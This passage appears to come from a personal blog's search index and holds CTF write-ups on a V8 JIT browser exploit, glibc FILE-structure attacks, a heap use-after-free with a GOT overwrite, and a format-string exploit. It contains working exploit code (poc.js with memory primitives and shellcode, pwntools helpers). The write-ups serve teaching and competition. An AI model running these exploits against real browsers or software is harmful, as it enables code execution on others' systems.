xmm0,r10 0x5554c0004840 80 c5fb11410f vmovsd [rcx+0xf],xmm0 0x5554c0004845 85 49ba682f62696e5aeb0c REX.W movq r10,0xceb5a6e69622f68 0x5554c000484f 8f c4c1f96ec2 vmovq xmm0,r10 0x5554c0004854 94 c5fb114117 vmovsd [rcx+0x17],xmm0 0x5554c0004859 99 49ba48c1e02031f6eb0c REX.W movq r10,0xcebf63120e0c148 0x5554c0004863 a3 c4c1f96ec2 vmovq xmm0,r10 0x5554c0004868 a8 c5fb11411f vmovsd [rcx+0x1f],xmm0 0x5554c000486d ad 49ba4801d031d250eb0c REX.W movq r10,0xceb50d231d00148 0x5554c0004877 b7 c4c1f96ec2 vmovq xmm0,r10 0x5554c000487c bc c5fb114127 vmovsd [rcx+0x27],xmm0 0x5554c0004881 c1 49ba4889e76a3b580f05 REX.W movq r10,0x50f583b6ae78948 Inside code property, we have two interesting properties: code: P","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:4","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"Final Step With our write gadget, let’s overwrite this code_entry_point by shifting its stored value to point to our first smuggled shellcode so that when we call foo, it will jump and execute our crafted shellcode. Notes that it is better to put the targeted JIT code at the top of our file so that it won’t mess up our created read-and-write gadgets. So, modify our poc.js to: const foo = ()=\u003e { return [1.0, 1.95538254221075331056310651818E-246, 1.95606125582421466942709801013E-246, 1.99957147195425773436923756715E-246, 1.95337673326740932133292175341E-246, 2.63486047652296056448306022844E-284]; } for (let i = 0; i \u003c 0x10000; i++) {foo();foo();foo();foo();} var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u003c\u003c 32n); } function itof(val) { u64_buf[0] = Number(val \u0026 0xffffffffn); u64_buf[1] = Number(val \u003e\u003e 32n); return f64_buf[0]; } var c = []; m = new Map(); m.set(1, 1); m.set(c.hole(), 1); m.delete(c.hole()); m.delete(c.hole()); m.delete(1); oob_arr = new Array(1.1, 2.2); m.set(0x10, -1); m.set(oob_arr, 0xffff); victim = [{}, {}, {}, {}]; read_gadget = [1.1, 2.2, 3.3]; function addrof(in_obj) { mask = (1n \u003c\u003c 32n) - 1n victim[0] = in_obj; return ftoi(oob_arr[12]) \u0026 mask; } function weak_read(addr) { oob_arr[37] = itof(0x600000000n+addr-0x8n); return ftoi(read_gadget[0]); } function weak_write(addr, value) { oob_arr[37] = itof(0x600000000n+addr-0x8n); read_gadget[0] = itof(value); } f_code = weak_read(addrof(foo)+0x18n) \u0026 ((1n \u003c\u003c 32n) - 1n); f_code_code_entry_point = weak_read(f_code+0xcn); weak_write(f_code+0xcn, f_code_code_entry_point+124n); foo(); What I do in the last step after creating these primitives are: Get the foo-\u003ecode stored pointer address by: Do addrof of foo. weak_read the address of foo-\u003ecode which is equivalent to foo+0x18 (Offset found by examination in gdb). Let’s call the fetched value as f_code weak_read the value of f_code-\u003ecode_entry_point which is equivalent to f_code+0xc. Let’s call the fetched value as f_code_code_entry_point weak_write the property f_code-\u003ecode_entry_point which is equivalent to f_code+0xc by f_code_code_entry_point+shift_offset, where the shift_offset is the distance between the starting JIT code instructions and your smuggled shellcode. Notes: The offset of the smuggled shellcode in the jitted area is different between ubuntu and debian. So, if you want to run this POC in ubuntu, you might need to adjust the offset to be added in our leaked f_code_code_entry_point value during the last call of weak_write. And let’s try to execute this. We will get a shell! Flag: hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((} Social Media Follow me on twitter ","date":"Nov 27, 2022","objectID":"/posts/hitcon-ctf-2022/:2:5","tags":["Writeup","HITCON","pwn","chrome","v8","JIT","browser","oob","2022"],"title":"HITCON CTF 2022","uri":"/posts/hitcon-ctf-2022/"},{"categories":null,"content":"When reading some of the pwn challenges in the recent Hacklu CTF 2022, the byor challenge was catching my eye, because it is about a FILE structure attack in the recent glibc. I have played CTF for a while, but I don’t have any idea about it at all. So, I decided to learn the fundamentals first on what it is and I was writing this note during the process. Some of the attacks or concepts that I will explain in this series won’t work in the recent glibc. But I believe we need to understand the old version attack first so that we have fundamentals of the FILE structure attack which will help us a lot in understanding the newest attack of it. This note is the summary of various resources that I read during learning about it and I hope that this article will help future me and other people who try to learn about it. Disclaimer Feel free to reach me in case you found any mistake in this article, as this is a new knowledge for me and my understanding might be wrong. FILE Explanation ","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:0:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"Intro FILE is a data type defined in the glibc which is usually used when we want to open a file in C. Note that this is different from the OS file descriptor that we usually use. The purpose of this data type is basically to make the file operation faster by using a buffer to reduce the number of IO syscall (read, write). The concept (simplified version) is that rather than you use write syscall each time you want to write new data to a file (which will directly write the data to the harddisk), by using the defined methods in the stdio lib for FILE data type operations (in this case is fwrite), stdio will try to handle all the operations by managing the data in the buffer first (resides in memory), and then will move it to the hard disk (via the OS syscall) when a certain condition is met (For example, when the buffer is full or got flushed). ","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:1:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"Implementation in C Reading through the source code of the glibc, below I try to summarize some notable implementations related to the FILE structure data type that we need to take a look at so that we can understand more about how it works (We use glibc-2.35 in this specific section, but keep in mind that there might be a little different on how the struct is defined on each glibc version). FILE typedef struct _IO_FILE FILE; Turn out, FILE datatype is a struct called _IO_FILE. _IO_FILE /* The tag name of this struct is _IO_FILE to preserve historic C++ mangled names for functions taking FILE* arguments. That name should not be used in new code. */ struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* Current read pointer */ char *_IO_read_end; /* End of get area. */ char *_IO_read_base; /* Start of putback+get area. */ char *_IO_write_base; /* Start of put area. */ char *_IO_write_ptr; /* Current put pointer. */ char *_IO_write_end; /* End of put area. */ char *_IO_buf_base; /* Start of reserve area. */ char *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; /* This used to be _offset but it's too small. */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; struct _IO_FILE_complete { struct _IO_FILE _file; #endif __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; This is the rough struct of how FILE is implemented. For now, we can skip first how will the fields be used. We will explain more about it later when we talk about the history of the attacking scenario in glibc via FILE structure. _IO_FILE_plus /* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ struct _IO_FILE_plus { FILE file; const struct _IO_jump_t *vtable; }; Glibc also has the extended version of _IO_FILE struct called _IO_FILE_plus, which is _IO_FILE + vtable (vtable = virtual table = array of pointers to the helper functions during executing the IO operation). The default filestream (stdin, stdout, stderr) is using this extended version instead of the raw _IO_FILE. Also if you open a file with fopen, it will use this extended version as well. Why do we use the extended version (_IO_FILE_plus)? The purpose is to make the IO operation faster by having the vtable. The data type for the vtable is _IO_jump_t (see below LOCs), which stores the pointer to the needed IO helper methods. _IO_jump_t struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_s","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:2:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":"The usage of vtable in a FILE structure To give an example of how the IO Operations work and how the vtable will be used, let’s take a look at what will happen when we call exit() in the below C program. #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e int main() { exit(1337); } What will happen when the binary executes the exit? Will IO operations take part in it? Let’s take a look at the glibc implementation (version 2.35) and try to follow the calls (I will skip some LOCs because I only want to showcase how the vtable will be used). exit void exit (int status) { __run_exit_handlers (status, \u0026__exit_funcs, true, true); } Okay, it turns out that exit will call __run_exit_handlers. Let’s move into that method. __run_exit_handlers /* Call all functions registered with `atexit' and `on_exit', in the reverse of the order in which they were registered perform stdio cleanup, and terminate program execution with STATUS. */ void attribute_hidden __run_exit_handlers (int status, struct exit_function_list **listp, bool run_list_atexit, bool run_dtors) { ... if (run_list_atexit) RUN_HOOK (__libc_atexit, ()); ... } Focusing on that LOC, What does it do? Inspecting the compiled binary via gdb, turn out it will call _IO_cleanup gef➤ disas __run_exit_handlers ... 0x00007ffff7a4a1fd \u003c+125\u003e: lea rbp,[rip+0x383694] # 0x7ffff7dcd898 \u003c__elf_set___libc_atexit_element__IO_cleanup__\u003e ... gef➤ disas __elf_set___libc_atexit_element__IO_cleanup__ Dump of assembler code for function _IO_cleanup: _IO_cleanup int _IO_cleanup (void) { /* We do *not* want locking. Some threads might use streams but that is their problem, we flush them underneath them. */ int result = _IO_flush_all_lockp (0); /* We currently don't have a reliable mechanism for making sure that C++ static destructors are executed in the correct order. So it is possible that other static destructors might want to write to cout - and they're supposed to be able to do so. The following will make the standard streambufs be unbuffered, which forces any output from late destructors to be written out. */ _IO_unbuffer_all (); return result; } What will _IO_flush_all_lockp do? _IO_flush_all_lockp int _IO_flush_all_lockp (int do_lock) { ... last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-\u003e_mode \u003c= 0 \u0026\u0026 fp-\u003e_IO_write_ptr \u003e fp-\u003e_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 \u0026\u0026 fp-\u003e_mode \u003e 0 \u0026\u0026 (fp-\u003e_wide_data-\u003e_IO_write_ptr \u003e fp-\u003e_wide_data-\u003e_IO_write_base)) #endif ) \u0026\u0026 _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) { /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; } else fp = fp-\u003e_chain; } ... } Some notes that you could take from reading those LOCs: _IO_flush_all_lockp will iterate all available FILE (iterating from the FILE linked list header stored in the _IO_list_all). If meeting certain conditions, it will call _IO_OVERFLOW (fp, EOF) Remember that _IO_OVERFLOW (fp, EOF) means that it will try to do the call by jumping to the stored pointer in the fp.vtable[__overflow]. This is one of the examples of how the vtable in a FILE object will be used, and this kind of IO operation happens in other methods as well, not limited to exit. N.B. If you try to explore more by yourself, in the method _IO_unbuffer_all which is also called during _IO_cleanup, you will notice that there is a vtable call as well, which is _IO_SETBUF (fp, NULL, 0); Possible Attack Scenario Taking an example from the above scenario on how IO operation works inside the exit call of C library, there are some possible attack scenarios that we can do to abuse the FILE structure: Hijack the vtable of the IO file (For example, stdout). Remember that when we call exit in the above example, it will iterate the FILE linked list, and if some constraint","date":"Nov 01, 2022","objectID":"/posts/file-structure-attack-part-1/:3:0","tags":["Education","FILE"],"title":"FILE Structure Attack: Part 1","uri":"/posts/file-structure-attack-part-1/"},{"categories":null,"content":" BlackHat MEA CTF 2022 Quals Final Scoreboard During this weekend, I played BlackHat MEA CTF 2022 with my team Fidethus. We managed to secure the 12th position on this CTF. Here are some of my write-ups for challenges that I solved during the CTF. pwn ","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:0:0","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Robot Factory ","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:0","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Initial Analysis Let’s start by checking the binary via checksec. Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Okay, so the binary is No PIE and Partial RELRO. This will help a lot! Now, let’s check the given Dockerfile FROM ubuntu:18.04 RUN apt-get update \u0026\u0026 apt-get -y upgrade RUN useradd -d /home/task/ -m -p task -s /bin/bash task RUN echo \"task:task\" | chpasswd WORKDIR /home/task COPY main . COPY flag.txt . COPY ynetd . COPY run.sh . RUN chown -R root:root /home/task RUN chmod 755 ynetd RUN chmod 755 main RUN chmod 777 flag.txt RUN chmod 755 run.sh USER task CMD [\"./run.sh\"] Okay, so the challenge is running in Ubuntu 18.04, and it uses libc-2.27 as the glibc version. Now, let’s try to analyze the binary by disassembling it. robots_factory undefined8 robots_factory(void) { int iVar1; puts(\"Welcome to the secret robots factory!\"); while( true ) { menu(); iVar1 = read_int(); if (iVar1 == 4) break; if (iVar1 \u003c 5) { if (iVar1 == 3) { destroy_robot(); } else if (iVar1 \u003c 4) { if (iVar1 == 1) { new_robot(); } else if (iVar1 == 2) { program_robot(); } } } } return 0; } We can see that the binary only gave us 3 menus, new, program, and destroy. Let’s check those methods. new_robot void new_robot(void) { int iVar1; void *pvVar2; long in_FS_OFFSET; uint local_20; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (number_robots \u003c 5) { puts(\"Provide robot memory size:\"); read(0,local_15,4); iVar1 = atoi(local_15); if (iVar1 \u003c 0x101) { puts(\"you\\'re creating a stupid robot.\"); } else { for (local_20 = 0; (int)local_20 \u003c 5; local_20 = local_20 + 1) { if (*(int *)(check_robot_slot + (long)(int)local_20 * 4) == 0) { pvVar2 = calloc(1,(long)iVar1); *(void **)(robots + (long)(int)local_20 * 8) = pvVar2; *(undefined4 *)(check_robot_slot + (long)(int)local_20 * 4) = 1; *(int *)(robot_memory_size + (long)(int)local_20 * 4) = iVar1; printf(\"You got new page at index %d\\n\",(ulong)local_20); number_robots = number_robots + 1; break; } } } } else { puts(\"All slots are occupied :(\"); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } We can notice some interesting notes from that method: The max size of the total active allocated chunks is only 5 We can only allocate chunks with size larger than 0x101, and based on the atoi method, the size is limited to 4 digits (which means the max value is 9999) Instead of malloc, it uses calloc. We will discuss the key differences later. The allocated chunk (we call it as robot) address is stored in global variable robots The size of the robot is also stored in a global variable called robot_memory_size. There is also a global variable called check_robot_slot which will be assigned to 1 if we create a new robot There’s also number_robots global variable, which will count how many robot we’ve created. So far, we didn’t see any bugs. Let’s move to the other methods. destroy_robot void destroy_robot(void) { int iVar1; long in_FS_OFFSET; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Provide robot\\'s slot:\"); read(0,local_15,4); iVar1 = atoi(local_15); if ((iVar1 \u003c 0) || (4 \u003c iVar1)) { puts(\"Slot is empty!\"); } else if (*(int *)(check_robot_slot + (long)iVar1 * 4) == 0) { puts(\"robot doesn\\'t exist!\"); } else { free(*(void **)(robots + (long)iVar1 * 8)); *(undefined4 *)(check_robot_slot + (long)iVar1 * 4) = 0; number_robots = number_robots + -1; } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } Notice that this destroys robot only nullify the check_robot_slot flag, but doesn’t null the robots pointer. This might be a bug. program_robot void program_robot(void) { int iVar1; long in_FS_OFFSET; char local_15 [5]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"Provide robot\\'s slot:\"); read(0,local_15,4); iVar1 = atoi(local_15); if ((iV","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:1","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now that we’ve known that there is a UAF bug, let’s summarize our findings so far: GLIBC version is 2.27 That means there is tcache bin, and every time we free a chunk with size \u003c 0x401, it will go to tcache bin first until it fulls When the tcache bin is full, based on its size, it will go to either unsortedbin or fastbin. By default, if the size is larger than 0x80, it will go to unsortedbin. Else, it will go to fastbin. It uses calloc instead of malloc What makes it differs is that calloc doesn’t use tcache bin at all. But, it can use fastbin or unsortedbin. So, if we free a chunk and it goes to tcache, if we call calloc again with the same freed size, it won’t use the tcache. Instead, it will create a new chunk. No PIE and Partial Relro, which means we can overwrite GOT easily as the address is fixed (Only if we can create arbitrary write primitive). There is a UAF bug in the program, which allow us to edit freed chunk. The minimum allocation is 0x101, which means it will go to either tcache or unsortedbin. Based on that summary, let’s try to think about how should we attack this binary. After reading a lot of resources on the internet and thinking for a while, I found a working plan that could work. First, let’s examine the global variable structure (To find the address, you can use gdb vmmap command to find the rw area of the binary) gef➤ x/38gx 0x00000000404000 0x404000: 0x0000000000403e20 0x00007ffff7ffe170 0x404010: 0x00007ffff7dea8f0 0x0000000000401030 0x404020 \u003cputs@got.plt\u003e: 0x00007ffff7a62970 0x00007ffff7af20f0 0x404030 \u003c__stack_chk_fail@got.plt\u003e: 0x0000000000401060 0x0000000000401070 0x404040 \u003cread@got.plt\u003e: 0x00007ffff7af2020 0x0000000000401090 0x404050 \u003csetvbuf@got.plt\u003e: 0x00007ffff7a632a0 0x00000000004010b0 0x404060: 0x0000000000000000 0x0000000000000000 0x404070: 0x0000000000000000 0x0000000000000000 0x404080 \u003cstdout@@GLIBC_2.2.5\u003e: 0x00007ffff7dce760 0x0000000000000000 0x404090 \u003cstdin@@GLIBC_2.2.5\u003e: 0x00007ffff7dcda00 0x0000000000000000 0x4040a0 \u003cstderr@@GLIBC_2.2.5\u003e: 0x00007ffff7dce680 0x0000000000000000 0x4040b0: 0x0000000000000000 0x0000000000000000 0x4040c0 \u003crobot_memory_size\u003e: 0x0000000000000000 0x0000000000000000 0x4040d0 \u003crobot_memory_size+16\u003e: 0x0000000000000000 0x0000000000000000 0x4040e0 \u003ccheck_robot_slot\u003e: 0x0000000000000000 0x0000000000000000 0x4040f0 \u003ccheck_robot_slot+16\u003e: 0x0000000000000000 0x0000000000000000 0x404100 \u003crobots\u003e: 0x0000000000000000 0x0000000000000000 0x404110 \u003crobots+16\u003e: 0x0000000000000000 0x0000000000000000 0x404120 \u003crobots+32\u003e: 0x0000000000000000 0x0000000000000000 Notice that the robots array is located at a higher address. If we’re somehow able to forge our good-sized chunk location so that it points to the area of robot_memory_size or check_robot_slot, we will be able to create an arbitrary write primitive, because if we call program_robot on that chunk, it will be able to edit robots array as well, where we can simply fill one of the elements with the target address that we want to overwrite, and then use program_robot again on the overwritten index to do arbitrary write. Also because it is No PIE, the address is fixed, so we don’t need a leak. Now moving to the next question, how can we forge a chunk so that it points to the global variable area? Remember that calloc doesn’t use tcache at all so that we can’t poison tcache pointers. We left with forging the metadata of fastbin chunk, but due to the limitation where we can only allocate chunk with size larger than 0x101, we can’t free chunk to the fastbin (It will go to unsortedbin). After reading resources, turn out fastbin has a variable called global_max_fast, which stored the maximum size of a chunk that can be freed to fastbin. So, we need a way to change this value, so that if we free chunk with size larger than 0x80 (the default value stored), it will go to fastbin. The trick here is to perform unsorted bin attack. You can find this attack in how2heap repo and this blog. To give more explanation, le","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:2","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":"Detailed Solution Now, based on those rough plans, let’s try to do detailed steps on how will we exploit this. To make our life easier, let’s try to create a helper first def create(r, size): r.sendlineafter(b'\u003e ', b'1') r.sendlineafter(b'size:\\n', str(size).encode()) def edit(r, idx, payload): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'slot:', str(idx).encode()) r.sendafter(b'robot:', payload) def free(r, idx): r.sendlineafter(b'\u003e ', b'3') r.sendlineafter(b'slot:', str(idx).encode()) After that, let’s prepare some offset that we will use later during doing GOT overwriting. # Due to no leak, we need to bruteforce so that this solution will work only if the last two bytes # of the libc base is 00 00 (0x0000) global_max_fast = 0xd940 # This is the only offset that will work system_offset = 0xf420 # This is the only offset that will work Remember that we don’t have any leaks, so brute forcing is required. In this solution, we plan to overwrite atoi GOT address with system offset. The assumption is that this solution will work only and only if: The libc base address two least significant bytes is 0x0000. For example 0x007ffff79e0000 will work. Only if the base address fulfills those criteria that our solution will be able to work. Why? Because on libc 2.27: The Offset of atoi is 0x40670 The Offset of system is 0x4f420 If the libc base address two least significant bytes starting with 0x0000, then we can partially overwrite two bytes of the GOT entry of atoi. For example, if the base starts with 0x1000, that means the atoi address will be 0x41670, and system is 0x50420. Notice that if we overwrite two bytes of the atoi with 0x0420, it will become 0x40420, and it isn’t the correct address for system Now we have found the correct offset, let’s move to the heap exploitation. # Fill tcache[0x110] until it got full tcache_size = 0x108 offset_increment = 0x260 # Based on gdb observation, when we create the first chunk, the offset will be heap_offset + 0x260 for i in range(7): # We can do this because calloc doesn't use tcache create(r, tcache_size) free(r, 0) log.info(\"Fulfill tcache...\") pause() Our target is to fulfill the tcache[0x110] bin. Because calloc doesn’t use tcache, we can simply repeatedly create and free to fulfill the tcache. Let’s check on gdb gef➤ heap bins tcache ──────────────────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────────────────── Tcachebins[idx=15, size=0x110, count=7] ← Chunk(addr=0x4058c0, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x4057b0, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x4056a0, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x405590, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x405480, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x405370, size=0x110, flags=PREV_INUSE) ← Chunk(addr=0x405260, size=0x110, flags=PREV_INUSE) And yup, tcache is full now. Let’s move to the next step, which is trying to overwrite global_max_fast value. # Create two chunk with size 0x108 # These will be used later for i in range(2): create(r, tcache_size) # Create huge chunk max_size = 0x2700 create(r, max_size) # Create small chunk, so that when we free huge chunk, it won't get consolidated create(r, 0x111) # This will be used as fake chunk later. We need to set the size to 0x111 free(r, 2) # Go to unsorted bin log.info(\"Now we have unsorted bin chunk\") Now, what we do: Create 2 small chunks with size 0x108, so that later when we freed this, it will go to fastbin when we have overwritten the global_max_fast. Create a huge chunk with size 0x2700. Later, when we free this, it will go to unsortedbin. Create two more small chunks just below the huge chunk with size specifically 0x111 for 2 reasons: So that when we free the huge chunk, it won’t be consolidated. So that the last entry of robot_memory_size will store value 0x111. This will be important later when we want to create the arbitrary write primitive. Let’s check in gdb: gef➤ heap bins unsorted ───────────────────","date":"Oct 02, 2022","objectID":"/posts/blackhat-mea-ctf-2022/:1:3","tags":["Writeup","BlackHat","pwn","heap","unsorted bin","fastbin"],"title":"BlackHat MEA CTF 2022","uri":"/posts/blackhat-mea-ctf-2022/"},{"categories":null,"content":" During this weekend, I played MapleCTF 2022 with my team idek. We managed to secure the 5th position on this CTF. Here is my write-up for some challenges that I solved during the CTF. Pwn ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:0:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"printf On this challenge, we were given a binary called chal. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:0","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Initial Analysis Let’s start by checking the binary via checksec. Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Okay, so the binary is PIE and Full RELRO. Now, let’s try to analyze the binary by disassembling it. main undefined8 main(void) { alarm(0x3c); setbuf(stdout,(char *)0x0); setbuf(stdin,(char *)0x0); ready(); return 0; } ready void ready(void) { set(); return; } set void set(void) { go(); return; } go long go(void) { int iVar1; undefined4 extraout_var; fgets(s,0x100,stdin); iVar1 = printf(s); return CONCAT44(extraout_var,iVar1); } Ah, okay looking at the go() method, there is a format string bug. But that’s it, we don’t have any leak (which we need), and yet we were only given one chance to do the format string. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:1","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Exploitation Plan Let’s start by trying to check the stack just before we call the printf method by gdb. We can see some interesting values here. The stack contains a libc address (to be precise __libc_start_main+243), and the stack address itself (We can see saved rbp of method go(), set(), and ready()). Our target is to pop a shell with the format string bug, and one printf won’t be enough for us. So, the plan is: Thinking about how to send our input and call printf multiple times, so that we will be more versatile on the exploit Try to leak the libc base address, and then calculate the execve address (via one_gadget). Overwrite one of the saved return pointers to the calculated address, so that it will pop a shell. ","date":"Aug 29, 2022","objectID":"/posts/maplectf-2022/:1:2","tags":["Writeup","MapleCTF","pwn","format string","shellcode"],"title":"MapleCTF 2022","uri":"/posts/maplectf-2022/"},{"categories":null,"content":"Solution To execute our plan, let’s try to use one_gadget first. I did a little bit of guessing, where based on the previous challenge called warmup2, I guessed that the libc version will be the same as my local (Ubuntu 20.04). So let’s try to do one_gadget on it. one_gadget '/usr/lib/x86_64-linux-gnu/libc-2.31.so' 0xe3afe execve(\"/bin/sh\", r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL 0xe3b01 execve(\"/bin/sh\", r15, rdx) constraints: [r15] == NULL || r15 == NULL [rdx] == NULL || rdx == NULL 0xe3b04 execve(\"/bin/sh\", rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL I’ll use the 0xe3b01 as the offset of our pop shell address, because based on observation in GDB, the r15 and rdx will be null, so it has fulfilled the constraints. Now, we know that: Via format string, we can leak the libc base address We have the gadget address of execve, which means we know the value that we need to write to one of the saved return pointers Let’s try to check the stack layout gef➤ tele 0x007fffffffdbc0│+0x0000: 0x007fffffffdbd0 → 0x007fffffffdbe0 → 0x007fffffffdbf0 → 0x0000000000000000 ← $rsp, $rbp 0x007fffffffdbc8│+0x0008: 0x005555555551f2 → \u003cset+18\u003e nop 0x007fffffffdbd0│+0x0010: 0x007fffffffdbe0 → 0x007fffffffdbf0 → 0x0000000000000000 0x007fffffffdbd8│+0x0018: 0x00555555555207 → \u003cready+18\u003e nop 0x007fffffffdbe0│+0x0020: 0x007fffffffdbf0 → 0x0000000000000000 0x007fffffffdbe8│+0x0028: 0x0055555555524e → \u003cmain+68\u003e mov eax, 0x0 0x007fffffffdbf0│+0x0030: 0x0000000000000000 0x007fffffffdbf8│+0x0038: 0x007ffff7ddd083 → \u003c__libc_start_main+243\u003e mov edi, eax Notice that the stack value in 0x007fffffffdbf8 is already pointing to the libc region. So, it is clear that we can just overwrite the last 3 bytes of the stored value with our calculated gadget address, but to do it, we need a way to repeat the go() method multiple times, so that we can overwrite the saved return pointer with our desired value. The idea is that the saved rbp of set(), which is located in the 0x007fffffffdbd0 is pointing to another stack address 0x007fffffffdbe0. If we’re able to overwrite the value stored in 0x007fffffffdbe0 with our desired address, we will be able to use it as our gadget to overwrite the stored pointer. For example: With format string attack, we overwrite the LSB of the value pointed by 0x007fffffffdbd0 with 0xc8. That means the stored value inside 0x007fffffffdbe0 will be changed from 0x007fffffffdbf0 to 0x007fffffffdbc8. Now, it points to the saved return pointer of the go() method. And then using the format string attack again, if we overwrite the LSB of the value pointed by 0x007fffffffdbe0, that means the value stored inside 0x007fffffffdbc8 will be overwritten, which means we now control our program execution flow. So, based on the above example, it is clear that the goal of our first format string loop is: Overwrite the 8th param pointed address last byte with 0xc8 (8th param is 0x007fffffffdbd0, pointing to 0x007fffffffdbe0, so what we overwrite is the value stored inside 0x007fffffffdbe0). After that, overwrite the 10th param pointed address last byte with 0xed(10th param is 0x007fffffffdbe0, which due to the first payload, is now pointing to the saved return pointer of go() :D). Now, the go() will return to set() and the set() will call go() again. We successfully create the loop. Also, don’t forget to leak the libc address and stack address as well in the first payload. So, the first 